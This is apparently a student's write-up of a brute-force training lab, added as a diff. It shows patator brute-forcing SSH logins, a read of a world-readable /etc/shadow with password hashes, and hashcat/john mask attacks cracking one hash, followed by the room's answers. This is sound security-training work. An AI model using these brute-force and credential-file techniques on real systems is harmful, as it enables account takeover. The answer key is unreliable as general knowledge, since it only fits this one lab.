@@ -458,3 +458,463 @@ Global options:
 
   Optimization:
     --rate-limit=N      wait N seconds between each attempt (default is 0)
+    --timeout=N         wait N seconds for a response before retrying payload
+                        (default is 0)
+    --max-retries=N     skip payload after N retries (default is 4) (-1 for
+                        unlimited)
+    -t N, --threads=N   number of threads (default is 10)
+    --groups=GROUPS     default is to iterate over the cartesian product of
+                        all payload sets, use this option to iterate over sets
+                        simultaneously instead (aka pitchfork), see syntax
+                        inside (default is '0,1..n')
+
+  Logging:
+    -l DIR              save output and response data into DIR
+    -L SFX              automatically save into DIR/yyyy-mm-dd/hh:mm:ss_SFX
+                        (DIR defaults to '/tmp/patator')
+    -R FILE             save output to FILE
+    --csv=FILE          save CSV results to FILE
+    --xml=FILE          save XML results to FILE
+    --hits=FILE         save found candidates to FILE
+
+  Debugging:
+    -d, --debug         enable debug messages
+    --auto-progress=N   automatically display progress every N seconds
+
+Syntax:
+ -x actions:conditions
+
+    actions    := action[,action]*
+    action     := "ignore" | "retry" | "free" | "quit" | "reset"
+    conditions := condition=value[,condition=value]*
+    condition  := "code" | "size" | "time" | "mesg" | "fgrep" | "egrep"
+
+    ignore      : do not report
+    retry       : try payload again
+    free        : dismiss future similar payloads
+    quit        : terminate execution now
+    reset       : close current connection in order to reconnect next time
+
+    code        : match status code
+    size        : match size (N or N-M or N- or -N)
+    time        : match time (N or N-M or N- or -N)
+    mesg        : match message
+    fgrep       : search for string in mesg
+    egrep       : search for regex in mesg
+
+For example, to ignore all redirects to the home page:
+... -x ignore:code=302,fgrep='Location: /home.html'
+
+ -e tag:encoding
+
+    tag        := any unique string (eg. T@G or _@@_ or ...)
+    encoding   := "hex" | "unhex" | "b64" | "md5" | "sha1" | "url"
+
+    hex         : encode in hexadecimal
+    unhex       : decode from hexadecimal
+    b64         : encode in base64
+    md5         : hash in md5
+    sha1        : hash in sha1
+    url         : url encode
+
+For example, to encode every password in base64:
+... host=10.0.0.1 user=admin password=_@@_FILE0_@@_ -e _@@_:b64
+
+Please read the README inside for more examples and usage information.
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ nano found_passwords.txt
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ cat found_passwords.txt 
+rhymes
+1qaz@WSX
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ patator ssh_login host=10.10.101.155 user=FILE0 password=_@@_FILE1_@@_ 0=userlist.txt 1=found_passwords.txt -x ignore:mesg='Authentication failed.' -x quit:mesg!='Authentication failed.'  -e _@@_:url              
+/home/kali/.local/lib/python3.10/site-packages/paramiko/transport.py:178: CryptographyDeprecationWarning: Blowfish has been deprecated
+  'class': algorithms.Blowfish,
+19:02:27 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.10.9 at 2023-02-05 19:02 EST
+19:02:28 patator    INFO -                                                                              
+19:02:28 patator    INFO - code  size    time | candidate                          |   num | mesg
+19:02:28 patator    INFO - -----------------------------------------------------------------------------
+19:03:30 patator    INFO - 0     39     0.569 | tommyboy1:1qaz@WSX                 |   162 | SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.2
+19:03:33 patator    INFO - Hits/Done/Skip/Fail/Size: 1/163/0/0/146624, Avg: 2 r/s, Time: 0h 1m 5s
+19:03:33 patator    INFO - To resume execution, pass --resume 16,17,16,16,17,17,16,16,16,16
+```
+What is the SSH username?
+*tommyboy1*
+What is their password (the encoded version) ?
+*1qaz%40WSX*
+What kind of encoding is this?
+*url*
+### Brute forcing - Hashes
+Hash cracking? But I thought this was a brute force lab?
+Well, it is - Hash cracking is really a form of brute forcing. This isn't a hash cracking / algorithm room, but the basics you need to know:
+-   Hash functions are one-way functions. This means they are easy to compute and should be hard to reverse ( we won't go into things like [SHAttered](https://shattered.io/) here, but it is worth looking at if you're interested)
+-   The same input will create the same output (we'll cover the use of salts further down the line)
+So as we cannot reverse the hash function, to crack a password hash, if we know what the algorithm used was, we can create a list of hashes using common or known passwords (a wordlist, for example). We can then compare our created hash to the hash we are trying to "crack". If you've got a match, you know the password.
+So you see, when you're cracking a hash really, you're engaging in a brute force attack by simply testing your luck creating hashes until you find a match. Not only that but brute force is a _type_ of hash cracking - Brute force-ception. The most common use case for hash cracking is that you provide a wordlist (like the ever popular rockyou) and let the cracker cycle through until it finds a match for the hash. But if you don't have a wordlist, or you've tried that already and got nowhere, you can double down on the brute force and have the cracker create it's own passwords on the fly to hash. This is what we'll be looking at in this task. Now, of course, these aren't the only hash cracking methods. Lookup tables with all the pre-cracked hashes (like [crackstation](https://crackstation.net/)) and [rainbow tables](https://www.geeksforgeeks.org/understanding-rainbow-table-attack/) are other hash cracking methods but also outside the scope of this room. So back to the room and task at hand - lets begin!
+We have now got full SSH access to our VM now as our username and encoded password from Task 7, so we can log in via SSH and look around and see if there is anything interesting. One of the first things we might want is to see what our current user can and can't do. In this instance, let's try running a sudo command as our user:
+sudo cat /etc/shadow
+The shadow file is a great place to start (especially if we're after some hashes to crack) - But no such luck... Let's check the shadow files permissions though. Maybe there is more than one way to cat a file.
+If we check the permissions using the command ls -l /etc/shadow, it looks like anyone can read the shadow file... Their mistake is our gain. Plus, it looks like if we read through the file there is another user on the system. Copy out the whole line starting with the username and add it to a file on your Kali or AttackBox machine. In this case, I've created the file hash.txt. The username is intentionally blanked out in the screenshot so that you can work out the correct user.
+Now there are two tools that (I at least think) are synonymous with hash cracking - [John the ripper](https://tryhackme.com/room/johntheripper0) and [Hashcat](https://hashcat.net/wiki/). There are pros and cons to both, and we won't get bogged down here going into that in detail. Safe to say, either one is going to be fine for our purpose here. Let's start with Hashcat.
+If we want to use Hashcat the first thing we'll need to do is work out the hash type we've got. Some of the Linux ninjas out there might not need to even bother with that. But it's handy to know _how_ to. So let's start there. If we look at the Hashcat wiki there is a link, for [Example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes). If we go to that page, we can see that it lists the hash mode, hash name and shows us an example. Your first challenge, working out the hash type we're dealing with here and subsequent mode.
+Once we have the mode, we can build our Hashcat command.  If we look at the Hashcat help command (hashcat -h) at the end, it will show some basic examples. We can use those to build our command. Now a commonly seen use for Hashcat is to use a wordlist, like
+hashcat -a 0 -m <mode> hash.txt <wordlist>
+But in this case, we don't know if our password is in a wordlist, and use cases like that are covered very widely. So instead we're going to use the hashcat brute force attack.
+hashcat -a 3 -m <mode> hash.txt <mask>
+Now the mask is essentially how we tell Hashcat the key space to brute force. It requires that we know a few details about the password we're cracking in advance, like how many characters and what those characters are (ideally). The more information we have, the more we can make sure our mask is accurate and reduce the key space, making our brute force hash crack attempt quicker. Using this information we can use the hashcat [built in charsets](https://hashcat.net/wiki/doku.php?id=mask_attack) to create a mask to match our password and crack it. For example, using the charsets provided by hashcat if we wanted to brute force a 5 character password that is made up of all digit characters, except the middle one, which is an upper case character our mask would be:
+?d?d?u?d?d
+Making our whole command (if this was say an SHA1 hash):
+hashcat -a 3 -m 100 hash.txt ?d?d?u?d?d
+This will then cycle through creating passwords that match this mask, for example 11A11, 21A11, 31A11, etc. Hashing them (using the provided hash type, in this case SHA1), and then testing them to see if they match the provided hash. So if our hashed password was 12E45, eventually this would happen:
+11A11-> Hashed = 1F4A4922FFFDB189E4D3D479C1376C69CC24026A - Incorrect!
+11A12 -> Hashed = 6DCD18DD86B0B6350BF82EEF98A1256B0AEC7026 - Incorrect!
+...
+...
+...
+11E45 -> Hashed = 3B88EF20F8305D09681CB6CF0F9EAC9963B8947E - Incorrect!
+12E45 -> Hashed = BBB1BD3B59508DBC913D758ECF492F3327F7B634 - Correct!
+The way the keyspace is searched will depend on the number of characters provided and is detailed in the provided link above. This is simply to illustrates how the process will work, when using the mask brute force attack.
+In our case, we can tell you that the password is 5 characters long and is made up of all lower case characters, except the middle one, which is a digit. If you're wondering how do we know that, we used a tried and tested method to work it out, best illustrated [here](https://xkcd.com/538/). Armed with this information, we can create our mask. Check the page linked above to see how to format your mask to check for two lowercase characters, a digit, followed by two more lower case characters.
+Now we have all the puzzle pieces, it's time to get cracking - Brute force style! This might take a bit of time, but it will work I promise. If you get beyond 10%  progress (you can view this by entering  s during your Hashcat crack to view the status), something has gone wrong. Make sure you copied the correct line and use the right mode, mask, etc.
+Once the password has been cracked, Hashcat will display to the screen the hash that was found, followed by a colon and then the password. Alternatively, Hashcat remembers the found passwords, and you can run the following command to display the cracked hashes:
+hashcat -m <mode> --show hash.txt
+So that's hashcat covered - What about John the ripper? Well, the command to use John is not very different. The only major difference is that with John we don't _need_ to specify the hash type. However, we can specify the type with the _format_ flag or run it without, and John will do it's best to automatically work out the hash type. For our hash we can just run the following:
+john hash.txt --mask=<mask>
+Using the same mask as we did with Hashcat (to view the mask options refer to the relevant [docs](https://github.com/openwall/john/blob/bleeding-jumbo/doc/MASK)), John will crack the hash just like Hashcat. Due to the way it explores the search-space, it may need to get up to 50% progress to find the password. Likewise, you can pass John the _--show_ option to display cracked passwords again once the password has been found.
+**BONUS**:
+In the new users home directory is a folder that contains a python script and a .txt file. If you want to play around some more with the use of masks and hashcracking feel free to use the contents of these files.
+If you read the python script, you'll see that this makes use of a hash and salt - Remember what we said before about how the same input creates the same output? Well, one way people have worked around this issue is the use of a salt. A salt is a value which is not part of the initial value / password but which can be appended or prepended during the hash process so that the same password creates a _different_ hash.
+Be warned if you want to try and brute force this hash using a mask attack, it will take a _long_ time, so we didn't include it here. But it might give you an idea of how long trying to brute force a hash would be in a real user situation.  You can also use a wordlist attack for this one (the provided passwords file will work fine as a wordlist here). Just make sure you've got the right mode (refer to the [Example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)).
+One final note - If you look at the page for example hashes you'll notice there are a _lot_ of them. The different algorithms being used can again be made different depending on the use of salts and even where the salt sits (before or after the password). You can get an idea of that just looking through the page. There is clearly a lot to the subject, which is beyond the scope of this room, but if you want to learn more a good place to start might be [Hashing vs Encryption vs Encoding](https://cheapsslsecurity.com/blog/explained-hashing-vs-encryption-vs-encoding/) as well as [How hashing works](https://cheapsslsecurity.com/blog/decoded-examples-of-how-hashing-algorithms-work/).
+Answer the questions below
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ ssh tommyboy1@10.10.101.155                             
+The authenticity of host '10.10.101.155 (10.10.101.155)' can't be established.
+ED25519 key fingerprint is SHA256:GurRyIjHyUB1YGz9jHxmy3jGVe3+BZg8pzG4y7H9HiM.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.101.155' (ED25519) to the list of known hosts.
+tommyboy1@10.10.101.155's password: 
+Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon  6 Feb 00:16:10 UTC 2023
+
+  System load:  0.0               Processes:             119
+  Usage of /:   52.9% of 8.79GB   Users logged in:       0
+  Memory usage: 31%               IPv4 address for eth0: 10.10.101.155
+  Swap usage:   0%
+
+ * Super-optimized for small spaces - read how we shrank the memory
+   footprint of MicroK8s to make it the smallest full K8s around.
+
+   https://ubuntu.com/blog/microk8s-memory-optimisation
+
+88 updates can be installed immediately.
+1 of these updates is a security update.
+To see these additional updates run: apt list --upgradable
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Sat Aug 28 16:15:10 2021 from 192.168.172.10
+tommyboy1@dvwaserver:~$ whoami
+tommyboy1
+tommyboy1@dvwaserver:~$ ls -l /etc/shadow
+-rw-r--r-- 1 root shadow 1217 Aug 28  2021 /etc/shadow
+tommyboy1@dvwaserver:~$ sudo cat /etc/shadow
+[sudo] password for tommyboy1: 
+tommyboy1 is not in the sudoers file.  This incident will be reported.
+tommyboy1@dvwaserver:~$ cat /etc/shadow
+root:*:18659:0:99999:7:::
+daemon:*:18659:0:99999:7:::
+bin:*:18659:0:99999:7:::
+sys:*:18659:0:99999:7:::
+sync:*:18659:0:99999:7:::
+games:*:18659:0:99999:7:::
+man:*:18659:0:99999:7:::
+lp:*:18659:0:99999:7:::
+mail:*:18659:0:99999:7:::
+news:*:18659:0:99999:7:::
+uucp:*:18659:0:99999:7:::
+proxy:*:18659:0:99999:7:::
+www-data:*:18659:0:99999:7:::
+backup:*:18659:0:99999:7:::
+list:*:18659:0:99999:7:::
+irc:*:18659:0:99999:7:::
+gnats:*:18659:0:99999:7:::
+nobody:*:18659:0:99999:7:::
+systemd-network:*:18659:0:99999:7:::
+systemd-resolve:*:18659:0:99999:7:::
+systemd-timesync:*:18659:0:99999:7:::
+messagebus:*:18659:0:99999:7:::
+syslog:*:18659:0:99999:7:::
+_apt:*:18659:0:99999:7:::
+tss:*:18659:0:99999:7:::
+uuidd:*:18659:0:99999:7:::
+tcpdump:*:18659:0:99999:7:::
+landscape:*:18659:0:99999:7:::
+pollinate:*:18659:0:99999:7:::
+usbmux:*:18846:0:99999:7:::
+sshd:*:18846:0:99999:7:::
+systemd-coredump:!!:18846::::::
+tommyboy1:$6$sOofVCulSPJdTck8$XpWS5BQL9eb9sZgGeTQsj0XhxjSOWCr8FHH33ZfgBqXP31rlwy086WRc.a6GShUFeKGzNqbCYEwGEq8Ye3Szb0:18846:0:99999:7:::
+lxd:!:18846::::::
+mysql:!:18846:0:99999:7:::
+crackme:$6$m023.TJqTqsrnQYM$XvFEaHFxu6qH50AgAyBI.LYdkjtB7xZrzaIRyddpknB.5UBr5E8jc0UDJTEDgIBNQFaKPizAlHsdfTScybDOa/:18867:0:99999:7:::
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ cat hash_brute_heroes.txt 
+$6$m023.TJqTqsrnQYM$XvFEaHFxu6qH50AgAyBI.LYdkjtB7xZrzaIRyddpknB.5UBr5E8jc0UDJTEDgIBNQFaKPizAlHsdfTScybDOa/
+
+using hashcat
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ hashcat -m 1800 -a 3 hash_brute_heroes.txt ?l?l?d?l?l
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ hashcat -m 1800 -a 3 hash_brute_heroes.txt ?l?l?d?l?l          
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #1: pthread-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 1240/2545 MB (512 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+
+Optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+* Brute-Force
+* Uses-64-Bit
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 0 MB
+
+Cracking performance lower than expected?                 
+
+* Append -O to the commandline.
+  This lowers the maximum supported password/salt length (usually down to 32).
+
+* Append -w 3 to the commandline.
+  This can cause your screen to lag.
+
+* Append -S to the commandline.
+  This has a drastic speed impact but can be better for specific attacks.
+  Typical scenarios are a small wordlist but a large ruleset.
+
+* Update your backend API runtime / driver the right way:
+  https://hashcat.net/faq/wrongdriver
+
+* Create more work items to make use of your parallelization power:
+  https://hashcat.net/faq/morework
+
+[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => s
+
+Session..........: hashcat
+Status...........: Running
+Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
+Hash.Target......: $6$m023.TJqTqsrnQYM$XvFEaHFxu6qH50AgAyBI.LYdkjtB7xZ...ybDOa/
+Time.Started.....: Sun Feb  5 19:59:17 2023 (1 min, 27 secs)
+Time.Estimated...: Sun Feb  5 22:33:09 2023 (2 hours, 32 mins)
+Kernel.Feature...: Pure Kernel
+Guess.Mask.......: ?l?l?d?l?l [5]
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:      495 H/s (11.62ms) @ Accel:256 Loops:128 Thr:1 Vec:4
+Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
+Progress.........: 43008/4569760 (0.94%)
+Rejected.........: 0/43008 (0.00%)
+Restore.Point....: 1536/175760 (0.87%)
+Restore.Sub.#1...: Salt:0 Amplifier:12-13 Iteration:640-768
+Candidate.Engine.: Device Generator
+Candidates.#1....: he6ch -> hz6le
+Hardware.Mon.#1..: Util: 92%
+
+[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => s
+
+Session..........: hashcat
+Status...........: Running
+Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
+Hash.Target......: $6$m023.TJqTqsrnQYM$XvFEaHFxu6qH50AgAyBI.LYdkjtB7xZ...ybDOa/
+Time.Started.....: Sun Feb  5 19:59:17 2023 (2 mins, 7 secs)
+Time.Estimated...: Sun Feb  5 22:29:15 2023 (2 hours, 27 mins)
+Kernel.Feature...: Pure Kernel
+Guess.Mask.......: ?l?l?d?l?l [5]
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:      508 H/s (10.77ms) @ Accel:256 Loops:128 Thr:1 Vec:4
+Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
+Progress.........: 64512/4569760 (1.41%)
+Rejected.........: 0/64512 (0.00%)
+Restore.Point....: 2304/175760 (1.31%)
+Restore.Sub.#1...: Salt:0 Amplifier:18-19 Iteration:1024-1152
+Candidate.Engine.: Device Generator
+Candidates.#1....: wd9ie -> wy6ke
+Hardware.Mon.#1..: Util: 92%
+
+[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => s
+
+Session..........: hashcat
+Status...........: Running
+Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
+Hash.Target......: $6$m023.TJqTqsrnQYM$XvFEaHFxu6qH50AgAyBI.LYdkjtB7xZ...ybDOa/
+Time.Started.....: Sun Feb  5 19:59:17 2023 (5 mins, 40 secs)
+Time.Estimated...: Sun Feb  5 22:31:13 2023 (2 hours, 26 mins)
+Kernel.Feature...: Pure Kernel
+Guess.Mask.......: ?l?l?d?l?l [5]
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:      501 H/s (13.64ms) @ Accel:256 Loops:128 Thr:1 Vec:4
+Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
+Progress.........: 170240/4569760 (3.73%)
+Rejected.........: 0/170240 (0.00%)
+Restore.Point....: 6400/175760 (3.64%)
+Restore.Sub.#1...: Salt:0 Amplifier:14-15 Iteration:4992-5000
+Candidate.Engine.: Device Generator
+Candidates.#1....: fu5xa -> fq5qu
+Hardware.Mon.#1..: Util: 49%
+
+[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => s
+
+Session..........: hashcat
+Status...........: Running
+Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
+Hash.Target......: $6$m023.TJqTqsrnQYM$XvFEaHFxu6qH50AgAyBI.LYdkjtB7xZ...ybDOa/
+Time.Started.....: Sun Feb  5 19:59:17 2023 (10 mins, 40 secs)
+Time.Estimated...: Sun Feb  5 22:34:55 2023 (2 hours, 24 mins)
+Kernel.Feature...: Pure Kernel
+Guess.Mask.......: ?l?l?d?l?l [5]
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:      489 H/s (14.43ms) @ Accel:256 Loops:128 Thr:1 Vec:4
+Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
+Progress.........: 313344/4569760 (6.86%)
+Rejected.........: 0/313344 (0.00%)
+Restore.Point....: 12032/175760 (6.85%)
+Restore.Sub.#1...: Salt:0 Amplifier:1-2 Iteration:4992-5000
+Candidate.Engine.: Device Generator
+Candidates.#1....: mv0in -> mw2in
+Hardware.Mon.#1..: Util: 88%
+
+$6$m023.TJqTqsrnQYM$XvFEaHFxu6qH50AgAyBI.LYdkjtB7xZrzaIRyddpknB.5UBr5E8jc0UDJTEDgIBNQFaKPizAlHsdfTScybDOa/:cr4ck
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
+Hash.Target......: $6$m023.TJqTqsrnQYM$XvFEaHFxu6qH50AgAyBI.LYdkjtB7xZ...ybDOa/
+Time.Started.....: Sun Feb  5 19:59:17 2023 (13 mins, 56 secs)
+Time.Estimated...: Sun Feb  5 20:13:13 2023 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Mask.......: ?l?l?d?l?l [5]
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:      487 H/s (10.24ms) @ Accel:256 Loops:128 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 406784/4569760 (8.90%)
+Rejected.........: 0/406784 (0.00%)
+Restore.Point....: 15616/175760 (8.88%)
+Restore.Sub.#1...: Salt:0 Amplifier:2-3 Iteration:4992-5000
+Candidate.Engine.: Device Generator
+Candidates.#1....: cd1dy -> cy1pi
+Hardware.Mon.#1..: Util: 90%
+
+Started: Sun Feb  5 19:58:47 2023
+Stopped: Sun Feb  5 20:13:16 2023
+
+or john
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ john hash_brute_heroes.txt -mask=?l?l?d?l?l
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ john hash_brute_heroes.txt -mask=?l?l?d?l?l          
+Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
+Use the "--format=HMAC-SHA256" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:10:36 17.06% (ETA: 20:47:45) 0g/s 1225p/s 1225c/s 1225C/s ch3dn..rz3dn
+0g 0:00:10:50 17.46% (ETA: 20:47:40) 0g/s 1227p/s 1227c/s 1227C/s yc1un..sv1un
+0g 0:00:11:59 19.48% (ETA: 20:47:09) 0g/s 1237p/s 1237c/s 1237C/s ij5er..zi4er
+0g 0:00:12:15 19.95% (ETA: 20:47:01) 0g/s 1240p/s 1240c/s 1240C/s ax6nr..fs7nr
+0g 0:00:12:20 20.11% (ETA: 20:46:57) 0g/s 1241p/s 1241c/s 1241C/s ph7rr..hz7rr
+Session aborted
+
+tooks more time
+```
+Which user can we crack the password for?
+read the shadow file
+*crackme*
+What mode do we need for the user's hash?
+Check the example page and run a Find for the first 3 chars of the hash
+*1800*
+What is the cracked password
+*cr4ck*
+What is the mask value we need to use?
+Check the hashcat built in charsets
+*?l?l?d?l?l*
+### Conclusion
+That's it. You've reached the end, and if you've managed all of the above, you can now call yourself a brute force hero and in your utility belt a few more tools.
+Most importantly, you hopefully know not only how to use these tools, but what tools can be used when and why they should (or shouldn't) be used. Knowing what command to run or how to run it is great. But if you know _why_, that is the most important thing because you'll find yourself getting stuck a lot less.
+So thank you for completing the room. The material covered within this room was in part taken (with permission) from a Cyber Security masters course.
+This room was created by myself ([kafaka157](https://tryhackme.com/p/kafaka157)) and [Heisenberg](https://tryhackme.com/p/Heisenberg).
+Answer the questions below
+Read the above
+Completed
+
+## Flags / Answers
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/601ffb71288b2a7db8a30375/room-content/c0972fada7f553828de466796425d6e8.jpg)
+- You should then see that your shell prompt has  (venv) in front of it and that patator runs with no problems like this:![](https://tryhackme-images.s3.amazonaws.com/user-uploads/601ffb71288b2a7db8a30375/room-content/ffd20af922ce2597241ac9be1eede766.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/601ffb71288b2a7db8a30375/room-content/e3810b7db0eb4b8e4089508c5e172d7e.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/601ffb71288b2a7db8a30375/room-content/3960f60746b050cb311be9913af186fd.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/601ffb71288b2a7db8a30375/room-content/6a3c6793e43eaedd3c478bbc7146dfbe.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/601ffb71288b2a7db8a30375/room-content/3cbfeaee136209ffcf3647a75e4c5b3f.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/601ffb71288b2a7db8a30375/room-content/a104679ec2f3b5f55dfe854458225bda.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/601ffb71288b2a7db8a30375/room-content/05a47f53b5508973a903cf73659e1287.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/601ffb71288b2a7db8a30375/room-content/1e99b83bb2992a933427529d44b01471.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/601ffb71288b2a7db8a30375/room-content/d02a82f84d6569f75e840aa64e5d4da1.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/601ffb71288b2a7db8a30375/room-content/66547657253141af1831aca9a2c1c94f.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/601ffb71288b2a7db8a30375/room-content/4ddbff09fc0b19fb0ba61f23bb3b89ff.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/601ffb71288b2a7db8a30375/room-content/1a0f999409447f35176a42cab2611a40.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/601ffb71288b2a7db8a30375/room-content/f89f655a0001d98e7e03fd3eabee1f77.gif)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/601ffb71288b2a7db8a30375/room-content/abb7746b2e8211080830defdbce9bb61.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/601ffb71288b2a7db8a30375/room-content/a46a2f4f3c734dfb215a068c3a77524c.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/601ffb71288b2a7db8a30375/room-content/95ccf0ed35a6755807fea4fb2fff3e38.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/601ffb71288b2a7db8a30375/room-content/7a732c36ca079cfabe7f4c3ed00ce181.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/601ffb71288b2a7db8a30375/room-content/86a14f3c092d893f119c89e69906a8d7.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/601ffb71288b2a7db8a30375/room-content/f398351ec37351a30e68783d2707d002.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/601ffb71288b2a7db8a30375/room-content/75f42694b728aea42982b79e7b4f9d49.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/601ffb71288b2a7db8a30375/room-content/37763ba330874c601253c70917fd76e7.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/601ffb71288b2a7db8a30375/room-content/1b9516c4e9135b7aa82aa3e486b3b173.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/601ffb71288b2a7db8a30375/room-content/52c8c598e99e0997dd10f08643ad4f8f.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/601ffb71288b2a7db8a30375/room-content/8ce4bae7d7f1191cfc48b726f98c9e3c.png)
+
+## Notes / Lessons Learned
+[[SQLMAP]]
+
